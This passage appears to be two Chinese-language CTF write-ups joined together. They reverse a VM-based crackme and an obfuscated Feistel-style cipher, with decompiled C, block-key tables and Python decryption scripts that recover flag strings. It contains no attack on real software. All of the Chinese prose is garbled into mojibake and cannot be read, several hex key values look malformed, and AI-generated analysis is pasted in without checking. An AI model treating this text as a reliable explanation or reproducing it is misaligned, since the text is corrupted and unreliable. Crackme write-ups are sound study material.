## 3. VM æŒ‡ä»¤é›†ï¼ˆsub_402850ï¼‰

`sub_402850` æ˜¯ VM è§£é‡Šå™¨ï¼Œæ“ä½œçš„æ˜¯ä¸€ä¸ªâ€œå¯„å­˜å™¨ + æ ˆâ€çš„è™šæ‹Ÿæœºï¼Œæ”¯æŒçš„ opcode åŒ…æ‹¬ï¼š

- ç«‹å³æ•°ä¸å¯„å­˜å™¨ï¼š
  - `0x10`: `MOVI reg, imm32`
  - `0x11`: `MOV reg1, reg2`
  - `0x01/0x02/0x03`: push imm / push reg / pop reg
- ç«‹å³æ•°ç®—æœ¯/ä½è¿ç®—ï¼š
  - `0x20` åŠ ã€`0x21` å‡ã€`0x22` XORã€`0x23` ä¹˜ã€`0x24` é™¤ã€`0x25` å–æ¨¡
  - `0x26/0x27` å·¦/å³ç§»ã€`0x28` ANDã€`0x29` ORã€`0x2A` NOT
  - `0x2B`ï¼šè°ƒç”¨ `sub_401244` â†’ `ROL32(reg, imm)`
  - `0x2C`ï¼šè°ƒç”¨ `sub_4011A4` â†’ `ROR32(reg, imm)`
- å¯„å­˜å™¨é—´ï¼š
  - `0x30` SWAPã€`0x31` INCã€`0x32` DEC
  - `0x40` ADDã€`0x41` SUBã€`0x42` XORã€`0x43` MUL
- `0xFF` ç»“æŸã€‚

æˆ‘ä»¬ä»¿ç…§è¿™äº›è§„åˆ™å†™äº†ä¸€ä¸ª Python VM è§£é‡Šå™¨ï¼Œå¯¹ 8 æ®µè„šæœ¬å…¨éƒ¨è·‘ä¸€éï¼Œå–å‡ºæ¯æ¬¡è„šæœ¬ç»“æŸæ—¶çš„ï¼š

- `v13 = reg[0]`
- `v14 = reg[1]`
- `v15 = reg[2]`
- `v16 = reg[3]`

å¹¶æŒ‰åŸé€»è¾‘ç®—å‡ºå—çš„ keyï¼š

```
key_j = (v14 + v16 * v15) ^ (40503 * v13);
```

å¾—åˆ°ï¼š

```
Block 0: v13=0xD5  v14=0x9F        v15=0x7  v16=0x11  key=0x083A2D5
Block 1: v13=0xAE5 v14=0x40000033  v15=0x9  v16=0x22  key=0x46BBAC56
Block 2: v13=0x14  v14=0xBB       v15=0xD  v16=0x33  key=0x00C5F1E
Block 3: v13=0x32  v14=0xF2       v15=0xE  v16=0x44  key=0x01EE214
Block 4: v13=0xBC  v14=0xDF       v15=0x2  v16=0x55  key=0x07431ED
Block 5: v13=0x1CB v14=0x4F       v15=0xA  v16=0x66  key=0x11BA8D6
Block 6: v13=0x35  v14=0x81       v15=0xF  v16=0x77  key=0x020C619
Block 7: v13=0x550 v14=0x80       v15=0x5  v16=0x88  key=0x3488718
```

------

## 4. åŠ¨æ€ 64-bit å£³ä¸å‡½æ•°é€‰æ‹©

`unk_40C260` æ˜¯ä¸€å°æ®µ 64-bit æ±‡ç¼–ï¼Œè¢« patch åçš„æ•ˆæœæ˜¯ï¼š

- ä» `dword_40C4E8` ç­‰åœ°å€è¯»å…¥ `(v13, v14, v15, v16)`ï¼›
- åšä¸€å † `imul/xor/add`ï¼Œç»“æœå†™å› `dword_40C508`ï¼Œåªç”¨ä½ 4 bit ä½œä¸ºç´¢å¼•ï¼š

```
idx = dword_40C508 & 0xF;
off_40C000[idx](block_j, 4, key_j);
```

é™æ€åˆ†æä¸å¥½ç²¾ç¡®è¿˜åŸè¿™æ®µæ•°å­¦å…¬å¼ï¼Œæ‰€ä»¥ç›´æ¥åœ¨æ–­ç‚¹å¤„è¯» `dword_10C508`ï¼ˆè¿è¡Œæ—¶åœ°å€ï¼‰ï¼š

```
æ¯æ¬¡æ–­ç‚¹åœä¸‹æ—¶ dword_10C508 çš„å€¼ï¼š
0x0D, 0x04, 0x00, 0x0C, 0x04, 0x06, 0x03, 0x00
```

å› æ­¤æ¯å—ç”¨çš„å‡½æ•°ç´¢å¼•ä¸ºï¼š

```
type[0..7] = [0xD, 4, 0, 0xC, 4, 6, 3, 0]
```

å¯¹åº” `off_40C000` è¡¨ï¼š

```
index : å‡½æ•°   : å«ä¹‰ï¼ˆåªåˆ—ç”¨åˆ°çš„å‡ ç§ï¼‰
0  -> sub_4015C0 : æ¯å­—èŠ‚ XOR (key >> (8*(i%4)))
3  -> sub_4017F0 : æ¯å­—èŠ‚ -= (key >> (8*(i%4)))
4  -> sub_4018A0 : é¦–å°¾ swapï¼ˆé•¿åº¦>=2 æ—¶ï¼‰
6  -> sub_401A40 : æ•´å— reverse
C  -> sub_401FD0 : é“¾å¼ XOR: a[i] ^= a[i-1]ï¼Œa[0] ^= åˆå§‹ a3
D  -> sub_402080 : a[i] = Hb(a3) ^ (8*a[i]) ^ (a3 * a[i])
```

------

## 5. é€†å‘åˆ†å—åŠ å¯†ï¼Œå†™è§£å¯†è„šæœ¬

å·²çŸ¥ç›®æ ‡å¯†æ–‡å—æ˜¯æ‹¼å‡ºæ¥çš„ v10/v11/v12/v13ï¼š

```
T = bytes([
    0x35, 0x67, 0x05, 0x2D,
    0x74, 0x40, 0x53, 0x31,
    0x41, 0x6F, 0x62, 0x45,
    0x4B, 0x1F, 0x57, 0x36,
    0x5F, 0x4B, 0x73, 0x6E,
    0x4F, 0x6C, 0x5F, 0x49,
    0x5D, 0x7F, 0x3F, 0x79,
    0x28, 0xD2, 0x69, 0x7E,
])
blocks = [bytearray(T[4*i:4*(i+1)]) for i in range(8)]
```

å¯¹åº” 8 å—çš„ `(type_j, key_j)` æˆ‘ä»¬å·²ç»æœ‰äº†ã€‚
 åªè¦é’ˆå¯¹è¿™äº›å‡½æ•°å†™**é€†å˜æ¢**ï¼š

- F0ï¼šXOR è‡ªåï¼Œè§£å¯†åŒåŠ å¯†ï¼›
- F3ï¼šåŠ å¯† `b -= k`ï¼Œè§£å¯† `b += k`ï¼›
- F4ï¼šé¦–å°¾äº¤æ¢ï¼Œè‡ªåï¼›
- F6ï¼šreverseï¼Œè‡ªåï¼›
- F12ï¼šé“¾å¼ XORï¼Œæ¨å¯¼å‡ºè§£å¯†å…¬å¼ï¼š
  - `p0 = c0 ^ (key & 0xFF)`
  - `pi = ci ^ c{i-1}`;
- F13ï¼šå¯¹äº `f(x) = Hb(a3) ^ (8*x) ^ (a3 * x)`ï¼Œåœ¨ 0..255 ä¸Šæ˜¯ç½®æ¢ï¼Œç›´æ¥æš´åŠ›å»ºé€†è¡¨ `inv[f(x)] = x`ã€‚

å†™æˆ Python é€†å‡½æ•°ï¼ŒæŒ‰é¡ºåºå¯¹ 8 ä¸ª 4-byte å—é€å—è¿˜åŸï¼Œæœ€ç»ˆå¾—åˆ°ï¼š

```
SYC{1@St_0nE_THanKs_I_lOvE_y0U!}
```

------

## 6. æœ€ç»ˆ flag

> **`SYC{1@St_0nE_THanKs_I_lOvE_y0U!}`**

æ•´ä¸ªé¢˜çš„æ ¸å¿ƒå°±æ˜¯ï¼š

- å…ˆåˆ†æ VMï¼ˆ`sub_402850` + `unk_40C040`ï¼‰æ‹¿åˆ°æ¯å—çš„å‚æ•°ï¼›
- å†ç”¨åŠ¨æ€ 64-bit å£³ï¼ˆ`unk_40C260`ï¼‰çš„ç»“æœ `dword_40C508` ç¡®å®šæ¯å—ä½¿ç”¨å“ªç§å˜æ¢ï¼›
- æœ€åå¯¹ `off_40C000` é‡Œçš„é‚£äº›ã€Œè½»åº¦æ··æ·†ã€å‡½æ•°åšé€†ã€‚

# obfuscat3 rev

ä¸€ç‚¹ç‚¹åˆ†æ

main

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int8 s1[32]; // [rsp+40h] [rbp-280h] BYREF
  void *src; // [rsp+60h] [rbp-260h]
  size_t n; // [rsp+68h] [rbp-258h]
  char s[48]; // [rsp+70h] [rbp-250h] BYREF
  unsigned __int8 v8[256]; // [rsp+A0h] [rbp-220h] BYREF
  unsigned __int8 v9[256]; // [rsp+1A0h] [rbp-120h] BYREF
  unsigned __int8 v10[8]; // [rsp+2A0h] [rbp-20h] BYREF
  __int64 v11; // [rsp+2A8h] [rbp-18h]
  int v12; // [rsp+2BCh] [rbp-4h]

  v12 = 0;
  *(_QWORD *)v10 = 0x8877665540302010LL;
  gen(v9, v8, v10);
  memset(s, 0, 0x24u);
  printf("Input the flag: ");
  if ( fgets(s, 36, stdin) )
  {
    n = strcspn(s, "\r\n");
    s[n] = 0;
    src = s;
    if ( n >= 3
      && *(unsigned __int8 *)src == 239
      && *((unsigned __int8 *)src + 1) == 187
      && *((unsigned __int8 *)src + 2) == 191 )
    {
      src = (char *)src + 3;
      n = n - 3;
    }
    if ( n && n <= 0x20 )
    {
      memset(s1, 0, sizeof(s1));
      memcpy(s1, src, n);
      real_en(s1, v10, v9, v8);
      if ( !memcmp(s1, &main::target_enc, 0x20u) )
        printf("Congratulations!\n");
      else
        printf("Try again?\n");
      return 0;
    }
    else
    {
      printf("Try again?\n");
      return 0;
    }
  }
  else
  {
    printf("Input error.\n");
    return 1;
  }
}
```

gen

```
__int64 __fastcall gen(unsigned __int8 *a1, unsigned __int8 *a2, const unsigned __int8 *a3)
{
  int v3; // ecx
  __int64 result; // rax
  char v5; // si
  int k; // [rsp+8h] [rbp-2Ch]
  unsigned __int8 v7; // [rsp+Fh] [rbp-25h]
  int j; // [rsp+10h] [rbp-24h]
  unsigned __int8 v9; // [rsp+17h] [rbp-1Dh]
  int i; // [rsp+18h] [rbp-1Ch]

  for ( i = 0; i < 256; i++ )
  {
    a1[i] = i;
  }
  v9 = 0;
  for ( j = 0; j < 256; ++j )
  {
    v5 = a1[j] + v9;
    v9 = a3[j % 16] + v5;
    v7 = a1[j];
    a1[j] = a1[v9];
    a1[v9] = v7;
  }
  for ( k = 0; k < 256; k++ )
  {
    a2[a1[k]] = k;
  }
}
```

real_en

```
unsigned __int8 *__fastcall real_en(
        unsigned __int8 *a1,
        unsigned __int8 *a2,
        unsigned __int8 *a3,
        const unsigned __int8 *a4)
{
  unsigned __int8 *v4; // rax
  int v5; // eax
  unsigned int v6; // r15d
  int v7; // eax
  unsigned int v8; // r14d
  unsigned int v9; // r12d
  unsigned int v10; // r8d
  int v11; // eax
  unsigned int v12; // r8d
  unsigned int v13; // eax
  int v14; // eax
  unsigned int v15; // r8d
  unsigned int v16; // eax
  unsigned __int8 *result; // rax
  int v18; // [rsp+8h] [rbp-B8h]
  int v19; // [rsp+Ch] [rbp-B4h]
  unsigned int v20; // [rsp+24h] [rbp-9Ch]
  int k; // [rsp+28h] [rbp-98h]
  unsigned int v22; // [rsp+2Ch] [rbp-94h]
  unsigned int v23; // [rsp+30h] [rbp-90h]
  unsigned int v24; // [rsp+34h] [rbp-8Ch]
  unsigned int v25; // [rsp+38h] [rbp-88h]
  int v26; // [rsp+3Ch] [rbp-84h]
  int v27; // [rsp+40h] [rbp-80h]
  int v28; // [rsp+44h] [rbp-7Ch]
  int v29; // [rsp+48h] [rbp-78h]
  int j; // [rsp+4Ch] [rbp-74h]
  _QWORD v31[5]; // [rsp+50h] [rbp-70h]
  int i; // [rsp+7Ch] [rbp-44h]
  const unsigned __int8 *v33; // [rsp+80h] [rbp-40h]
  unsigned __int8 *v34; // [rsp+88h] [rbp-38h]
  unsigned __int8 *v35; // [rsp+90h] [rbp-30h]
  unsigned __int8 *v36; // [rsp+98h] [rbp-28h]

  v36 = a1;
  v35 = a2;
  v34 = a3;
  v33 = a4;
  en1(a1, a2, 32);
  for ( i = 0; i < 32; ++i )
    v36[i] = v34[v36[i]];
  for ( j = 0; j < 32; ++j )
    *((_BYTE *)v31 + j) = v36[(unsigned __int8)perm[j]];
  v4 = v36;
  *(_QWORD *)v36 = v31[0];
  *((_QWORD *)v4 + 1) = v31[1];
  *((_QWORD *)v4 + 2) = v31[2];
  *((_QWORD *)v4 + 3) = v31[3];
  v29 = *(_DWORD *)v36;
  v28 = *((_DWORD *)v36 + 1);
  v27 = *((_DWORD *)v36 + 2);
  v26 = *((_DWORD *)v36 + 3);
  v25 = *((_DWORD *)v36 + 4);
  v24 = *((_DWORD *)v36 + 5);
  v23 = *((_DWORD *)v36 + 6);
  v22 = *((_DWORD *)v36 + 7);
  for ( k = 0; k < 4; k = k ++ )
  {
    v20 = *(_DWORD *)&v35[4 * (k % 4)];
    v19 = v29;
    v5 = F(v28, v20, v34);
    v6 = ~(~v19 | 0xEB4BED4) & 0xA658CF3F | ~v19 & 0x51030000 | 0x8A430C0;
    v29 = v28;
    v28 = ((v5 & (v5 ^ 0xEB4BED4) ^ ~(v5 | 0xF14B412B) | v5 & (v5 ^ 0xEB4BED4) & ~(v5 | 0xF14B412B)) & 0x570E3026
         | ~(v5 & (v5 ^ 0xEB4BED4) ^ ~(v5 | 0xF14B412B) | v5 & (v5 ^ 0xEB4BED4) & ~(v5 | 0xF14B412B)) & 0xA8F1CFD9)
        ^ ((~(~v19 | 0xEB4BED4 | ~((v19 & 0x26ECDD09 | ~v19 & 0xD91322F6) ^ 0x26ECDD09) | 0xF14B412B)
          | v6
          ^ (~(~((v19 & 0x26ECDD09 | ~v19 & 0xD91322F6) ^ 0x26ECDD09) | 0xF14B412B) & 0xA658CF3F
           | ~((v19 & 0x26ECDD09 | ~v19 & 0xD91322F6) ^ 0x26ECDD09) & 0x8A430C0
           | 0x51030000))
         & 0x570E3026
         | ~(~(~v19 | 0xEB4BED4 | ~((v19 & 0x26ECDD09 | ~v19 & 0xD91322F6) ^ 0x26ECDD09) | 0xF14B412B)
           | v6
           ^ (~(~((v19 & 0x26ECDD09 | ~v19 & 0xD91322F6) ^ 0x26ECDD09) | 0xF14B412B) & 0xA658CF3F
            | ~((v19 & 0x26ECDD09 | ~v19 & 0xD91322F6) ^ 0x26ECDD09) & 0x8A430C0
            | 0x51030000))
         & 0xA8F1CFD9);
    v18 = v27;
    v7 = F(v26, v20, v34);
    v8 = ((v7 & 0x21F2A0FD | ~v7 & 0xDE0D5F02) ^ 0x21F2A0FD) & ((v7 & 0x21F2A0FD | ~v7 & 0xDE0D5F02) ^ 0x8D8B5839);
    v9 = v18 & (v18 ^ 0x5386073B) & 0x90D711C3 | ~(v18 & (v18 ^ 0x5386073B)) & 0x6F28EE3C;
    v10 = ~(~(v7 & (v7 ^ 0x5386073B)) | ~v8)
        | (v7 & (v7 ^ 0x5386073B) & 0x3F3060DC | ~(v7 & (v7 ^ 0x5386073B)) & 0xC0CF9F23)
        ^ (v8 & 0x3F3060DC | ~v8 & 0xC0CF9F23);
    v27 = v26;
    v26 = ~v10
        & (~(~(v18 & (v18 ^ 0x5386073B))
           | ~((~((v18 & 0x25B14CE4 | ~v18 & 0xDA4EB31B) ^ 0x25B14CE4) ^ 0x5386073B) & 0x5386073B))
         | v9
         ^ ((~((v18 & 0x25B14CE4 | ~v18 & 0xDA4EB31B) ^ 0x25B14CE4) ^ 0x5386073B) & 0x10860103
          | ~((~((v18 & 0x25B14CE4 | ~v18 & 0xDA4EB31B) ^ 0x25B14CE4) ^ 0x5386073B) & 0x5386073B) & 0x6F28EE3C))
        | ~(~(~(v18 & (v18 ^ 0x5386073B))
            | ~((~((v18 & 0x25B14CE4 | ~v18 & 0xDA4EB31B) ^ 0x25B14CE4) ^ 0x5386073B) & 0x5386073B))
          | v9
          ^ ((~((v18 & 0x25B14CE4 | ~v18 & 0xDA4EB31B) ^ 0x25B14CE4) ^ 0x5386073B) & 0x10860103
           | ~((~((v18 & 0x25B14CE4 | ~v18 & 0xDA4EB31B) ^ 0x25B14CE4) ^ 0x5386073B) & 0x5386073B) & 0x6F28EE3C))
        & v10;
    v11 = F(v24, v20, v34);
    v12 = ~(~((v25 & 0x18B2EB35 | ~v25 & 0xE74D14CA) ^ 0x18B2EB35) | ~v11);
    v13 = ~(~((v11 & 0x25D1456C | ~v11 & 0xDA2EBA93) ^ 0x25D1456C) | ~v25);
    v25 = v24;
    v24 = v13 ^ v12 | v13 & v12;
    v14 = F(v22, v20, v34);
    v15 = v14 & (~((v23 & 0xB1196C8E | ~v23 & 0x4EE69371) ^ 0xB1196C8E) ^ v14);
    v16 = ~(~((v14 & 0x99A3FFEB | ~v14 & 0x665C0014) ^ 0x99A3FFEB) | ~v23);
    v23 = v22;
    v22 = v16 ^ v15 | v16 & v15;
  }
  *(_DWORD *)v36 = v29;
  *((_DWORD *)v36 + 1) = v28;
  *((_DWORD *)v36 + 2) = v27;
  *((_DWORD *)v36 + 3) = v26;
  *((_DWORD *)v36 + 4) = v25;
  *((_DWORD *)v36 + 5) = v24;
  *((_DWORD *)v36 + 6) = v23;
  result = v36;
  *((_DWORD *)v36 + 7) = v22;
  return result;
}
```

å…ˆç”¨aiåˆ†æå‡ºen1å’ŒFçš„å…·ä½“å®ç°

```
 // 
                                                // def rol32(x, n):
                                                //     """32ä½å¾ªç¯å·¦ç§»"""
                                                //     return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF
                                                // 
                                                // def F(a1, a2, sbox):
                                                //     """
                                                //     Få‡½æ•°çš„å®é™…å®ç°
                                                //     
                                                //     å‚æ•°:
                                                //         a1: int, 32ä½è¾“å…¥å€¼
                                                //         a2: int, 32ä½å¯†é’¥å€¼  
                                                //         sbox: list, 256å­—èŠ‚çš„S-box
                                                //     
                                                //     è¿”å›:
                                                //         int, 32ä½ç»“æœå€¼
                                                //     """
                                                //     # 1. è®¡ç®— a1 å’Œ a2 çš„å¼‚æˆ–
                                                //     xor_val = (a1 ^ a2) & 0xFFFFFFFF
                                                //     
                                                //     # 2. é€šè¿‡S-boxè¿›è¡Œå­—èŠ‚æ›¿æ¢
                                                //     b0 = sbox[(xor_val >> 0) & 0xFF]   # æœ€ä½å­—èŠ‚
                                                //     b1 = sbox[(xor_val >> 8) & 0xFF]   # ç¬¬2å­—èŠ‚
                                                //     b2 = sbox[(xor_val >> 16) & 0xFF]  # ç¬¬3å­—èŠ‚
                                                //     b3 = sbox[(xor_val >> 24) & 0xFF]  # æœ€é«˜å­—èŠ‚
                                                //     
                                                //     # 3. é‡æ–°ç»„åˆä¸º32ä½å­—
                                                //     combined = (b3 << 24) | (b2 << 16) | (b1 << 8) | b0
                                                //     
                                                //     # 4. å¾ªç¯å·¦ç§»5ä½
                                                //     result = rol32(combined, 5)
                                                //     
                                                //     return result
                                                //     
                                                //     def en1(a1, a2, a3):
                                                //     """
                                                //     en1å‡½æ•°çš„å®é™…å®ç° - ç®€å•çš„å¼‚æˆ–åŠ å¯†
                                                //     
                                                //     å‚æ•°:
                                                //         a1: bytearray, è¾“å…¥æ•°æ®ï¼ˆä¼šè¢«ä¿®æ”¹ï¼‰
                                                //         a2: bytearray, 16å­—èŠ‚å¯†é’¥  
                                                //         a3: int, è¦å¤„ç†çš„å­—èŠ‚æ•°
                                                //     
                                                //     è¿”å›:
                                                //         int, å¤„ç†çš„å­—èŠ‚æ•°
                                                //     """
                                                //     for i in range(a3):
                                                //         a1[i] ^= a2[i % 16]
                                                //     return a3
```

ç„¶åæŠŠå‰©ä¸‹çš„ä¸€å¹¶ä¸¢ç»™ai

è§£å¯†è„šæœ¬

```
import struct

MASK = 0xFFFFFFFF

def rol32(x, n):
    return ((x << n) | (x >> (32 - n))) & MASK

def F(a1, a2, sbox):
    xor_val = (a1 ^ a2) & MASK
    b0 = sbox[(xor_val >> 0) & 0xFF]
    b1 = sbox[(xor_val >> 8) & 0xFF]
    b2 = sbox[(xor_val >> 16) & 0xFF]
    b3 = sbox[(xor_val >> 24) & 0xFF]
    combined = (b3 << 24) | (b2 << 16) | (b1 << 8) | b0
    return rol32(combined, 5)

def gen_sboxes_from_key(key_bytes):
    # å¯¹åº” C é‡Œçš„ gen(a1, a2, key)
    a1 = list(range(256))
    v9 = 0
    for j in range(256):
        v5 = (a1[j] + v9) & 0xFF
        v9 = (key_bytes[j % 16] + v5) & 0xFF
        v7 = a1[j]
        a1[j] = a1[v9]
        a1[v9] = v7
    a2 = [0] * 256
    for k in range(256):
        a2[a1[k]] = k
    return a1, a2   # S, S_inv

# 16 å­—èŠ‚å¯†é’¥ï¼ˆæŒ‰å°ç«¯ä»ä¸¤ä¸ª 64 ä½å¸¸é‡æ‹†å‡ºæ¥ï¼‰
q1 = 0x8877665540302010
q2 = 0x2301EFDECDBCAB90
key_bytes = list(struct.pack("<Q", q1) + struct.pack("<Q", q2))

S, S_inv = gen_sboxes_from_key(key_bytes)

# 4 ä¸ª 32 ä½å­å¯†é’¥ï¼ˆæŒ‰å°ç«¯ï¼‰
round_keys = [struct.unpack_from("<I", bytes(key_bytes), 4 * i)[0]
              for i in range(4)]

# perm æ•°ç»„ï¼ˆåŠ å¯†æ—¶æ˜¯å³ç§» 1 å­—èŠ‚ï¼‰
perm = [
    0x1F, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E,
    0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16,
    0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E
]

# è®¡ç®—é€†ç½®æ¢ï¼ˆç”¨äºè§£å¯†ï¼‰
inv_perm = [0] * 32
for i, p in enumerate(perm):
    inv_perm[p] = i

def feistel_decrypt_pair(L, R):
    # 4 è½® Feistel é€†å˜æ¢
    for rk in reversed(round_keys):
        R_old = L
        L_old = F(R_old, rk, S) ^ R
        L = L_old & MASK
        R = R_old & MASK
    return L & MASK, R & MASK

def decrypt_block32(cipher_bytes: bytes) -> bytes:
    assert len(cipher_bytes) == 32

    # 1. å…ˆæŒ‰ 8 ä¸ª 32 ä½å°ç«¯æ•°è§£åŒ…
    words = list(struct.unpack("<8I", cipher_bytes))

    # 2. æ¯ä¸¤è¯ä¸€å¯¹åš Feistel è§£å¯†
    for i in range(0, 8, 2):
        L, R = words[i], words[i + 1]
        L2, R2 = feistel_decrypt_pair(L, R)
        words[i], words[i + 1] = L2, R2

    # 3. æ‰“åŒ…å› 32 å­—èŠ‚
    b = list(struct.pack("<8I", *words))

    # 4. é€† permï¼ˆç›¸å½“äºå¾ªç¯å·¦ç§» 1 å­—èŠ‚ï¼‰
    b2 = [0] * 32
    for i in range(32):
        b2[i] = b[inv_perm[i]]

    # 5. é€† S ç›’
    b3 = [S_inv[x] for x in b2]

    # 6. å¼‚æˆ–å›å¯†é’¥
    plain = bytes((b3[i] ^ key_bytes[i % 16]) & 0xFF for i in range(32))
    return plain

if __name__ == "__main__":
    target_enc = bytes([
        0xCA, 0x5A, 0x96, 0xFF, 0x08, 0x49, 0x72, 0x39,
        0x36, 0x18, 0x13, 0x8A, 0x14, 0xC0, 0x0C, 0x78,
        0xF8, 0x7C, 0x49, 0xC7, 0xBE, 0xE8, 0x91, 0xED,
        0x7F, 0xB0, 0x02, 0xAD, 0x77, 0x74, 0xD4, 0x34
    ])

    plain32 = decrypt_block32(target_enc)
    print("raw bytes:", plain32)
    # å»æ‰å°¾éƒ¨è¡¥çš„ 0
    flag = plain32.rstrip(b"\x00").decode(errors="ignore")
    print("flag:", flag)

```







å…ˆæŠŠç»“è®ºè¯´åœ¨å‰é¢ï¼š
 è¿™æ®µåŠ å¯†å®é™…ä¸Šæ˜¯ä¸€ä¸ªã€Œå¼‚æˆ– + S ç›’ + 1 å­—èŠ‚å¾ªç¯ç§»ä½ + 4 è½® Feistelã€çš„ç»“æ„ï¼Œå¯ä»¥å®Œå…¨æŒ‰é€»è¾‘åè¿‡æ¥è§£å¯†ã€‚
 æŠŠé¢˜ç›®é‡Œçš„ `target_enc` 32 å­—èŠ‚ä¸¢è¿›è§£å¯†è„šæœ¬ï¼Œè§£å‡ºæ¥çš„æ˜æ–‡æ˜¯ï¼š

```text
SYC{Then_you_are_1mpressivse}
```

ä¸‹é¢æ˜¯åˆ†æè¿‡ç¨‹ + å¯ç›´æ¥è·‘çš„è§£å¯†è„šæœ¬ã€‚

------

## 1. æ•´ä½“æµç¨‹æ¢³ç†

### main éƒ¨åˆ†

1. è¯»å…¥æœ€å¤š 35 å­—ç¬¦ï¼Œå»æ‰æ¢è¡Œã€‚

2. å¦‚æœå¼€å¤´æ˜¯ UTF-8 BOM `EF BB BF`ï¼Œå°±æŠŠè¿™ 3 å­—èŠ‚è·³è¿‡ã€‚

3. æ£€æŸ¥é•¿åº¦ `n` åœ¨ `1..0x20(32)` ä¹‹é—´ã€‚

4. `s1` å…ˆ `memset` ä¸º 0ï¼Œå† `memcpy(s1, src, n)` â€”â€”ä¹Ÿå°±æ˜¯è¯´ï¼Œ**è¾“å…¥æŒ‰å­—èŠ‚å¤åˆ¶åˆ°å‰é¢ï¼Œåé¢è¡¥ 0 åˆ° 32 å­—èŠ‚**ã€‚

5. è°ƒç”¨ï¼š

   ```c
   gen(v9, v8, v10);  // ç”Ÿæˆ S ç›’
   real_en(s1, v10, v9, v8);
   ```

   è‹¥ `memcmp(s1, target_enc, 0x20) == 0`ï¼Œå³ 32 å­—èŠ‚å…¨éƒ¨ç›¸ç­‰ï¼Œåˆ™é€šè¿‡ã€‚

è¿™é‡Œçš„å…³é”®æ˜¯ï¼š**flag å®é™…è¢«åŠ å¯†çš„æ˜æ–‡å°±æ˜¯ 32 å­—èŠ‚ï¼ŒçœŸå®è¾“å…¥åœ¨å‰é¢ï¼Œåé¢æ˜¯é›¶å¡«å……**ã€‚

------

## 2. S ç›’ & åˆå§‹å¼‚æˆ–

### å¯†é’¥ v10

```c
*(_QWORD *)v10 = 0x8877665540302010LL;
v11 = 0x2301EFDECDBCAB90LL;
```

åœ¨å°ç«¯ä¸‹ï¼Œ16 å­—èŠ‚å¯†é’¥ä¸ºï¼š

```text
[0x10, 0x20, 0x30, 0x40, 0x55, 0x66, 0x77, 0x88,
 0x90, 0xAB, 0xBC, 0xCD, 0xDE, 0xEF, 0x01, 0x23]
```

### gen ç”Ÿæˆ S ç›’

```c
gen(v9, v8, v10);
```

`gen(a1, a2, key)` åšçš„æ˜¯ RC4-KSA é£æ ¼çš„ç½®æ¢ï¼š

- `a1` åˆå§‹åŒ–ä¸º `0..255`ã€‚
- ç”¨ 16 å­—èŠ‚ key åšä¸€è½® KSAï¼Œå¾—åˆ°ä¸€ä¸ª 256 å­—èŠ‚çš„æ’åˆ— `S`ã€‚
- ç„¶å `a2[a1[k]] = k`ï¼Œå³ `a2` æ˜¯ `S` çš„é€†ç½®æ¢ã€‚

ç»“åˆè°ƒç”¨é¡ºåºï¼š

- `v9` = `S`ï¼ˆS ç›’ï¼‰
- `v8` = `S^-1`ï¼ˆé€† S ç›’ï¼‰

è€Œåœ¨ `real_en` ä¸­ï¼š

```c
real_en(s1, v10, v9, v8);
// a1 = s1
// a2 = v10 (key)
// a3 = v9  (S ç›’)
// a4 = v8  (é€† S ç›’ï¼Œä½†åŠ å¯†æµç¨‹é‡Œæ²¡ç”¨)
```

### real_en å¼€å¤´

```c
en1(a1, a2, 32);        // a1[i] ^= key[i % 16]
for (i = 0; i < 32; ++i)
    v36[i] = v34[v36[i]];    // v34 = a3 = S ç›’
```

ä¹Ÿå°±æ˜¯ï¼š

1. **å…ˆå¯¹ 32 å­—èŠ‚é€å­—èŠ‚ä¸ 16 å­—èŠ‚ key å¼‚æˆ–**ï¼›
2. å†å¯¹æ¯ä¸ªå­—èŠ‚ `x[i]` åš `x[i] = S[x[i]]`ã€‚

------

## 3. 32 å­—èŠ‚çš„ç½®æ¢ï¼ˆpermï¼‰

```c
for ( j = 0; j < 32; ++j )
    *((_BYTE *)v31 + j) = v36[(unsigned __int8)perm[j]];
...
unsigned char perm[] = {
  0x1F, 0x00, 0x01, ... , 0x1E
};
```

ä¹Ÿå°±æ˜¯ï¼š

```text
out[0] = in[31]
out[1] = in[0]
out[2] = in[1]
...
out[31] = in[30]
```

è¿™æ˜¯ä¸€ä¸ª **å¯¹ 32 å­—èŠ‚æ•´ä½“å¾ªç¯å³ç§» 1 å­—èŠ‚** çš„ç½®æ¢ã€‚

é€†ç½®æ¢å°±æ˜¯å¾ªç¯å·¦ç§» 1 å­—èŠ‚ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ„é€  `inv_perm` å®ç°ã€‚

------

## 4. Feistel ç»“æ„ï¼ˆæ ¸å¿ƒï¼‰

ç½®æ¢ä¹‹åï¼ŒæŠŠ 32 å­—èŠ‚è§†ä¸º 8 ä¸ª 32 ä½å°ç«¯æ•´æ•°ï¼š

```c
v29 = w0;
v28 = w1;
v27 = w2;
v26 = w3;
v25 = w4;
v24 = w5;
v23 = w6;
v22 = w7;
```

ç„¶åæ‰§è¡Œ 4 è½®å¾ªç¯ï¼š

```c
for (k = 0; k < 4; k++)
{
    v20 = *(_DWORD *)&v35[4 * (k % 4)]; // v35 = key bytes
    ...
}
```

`v35` å°±æ˜¯ 16 å­—èŠ‚ keyï¼Œæ‰€ä»¥ 4 ä¸ªå­å¯†é’¥ï¼ˆå°ç«¯ï¼‰æ˜¯ï¼š

```text
K0 = 0x40302010
K1 = 0x88776655
K2 = 0xCDBCAB90
K3 = 0x2301EFDE
```

### F å‡½æ•°ï¼ˆé¢˜ç›®é‡Œå·²ç»ç»™äº† Python ç‰ˆï¼‰

```python
def rol32(x, n):
    return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF

def F(a1, a2, sbox):
    xor_val = (a1 ^ a2) & 0xFFFFFFFF
    b0 = sbox[(xor_val >> 0) & 0xFF]
    b1 = sbox[(xor_val >> 8) & 0xFF]
    b2 = sbox[(xor_val >> 16) & 0xFF]
    b3 = sbox[(xor_val >> 24) & 0xFF]
    combined = (b3 << 24) | (b2 << 16) | (b1 << 8) | b0
    return rol32(combined, 5)
```

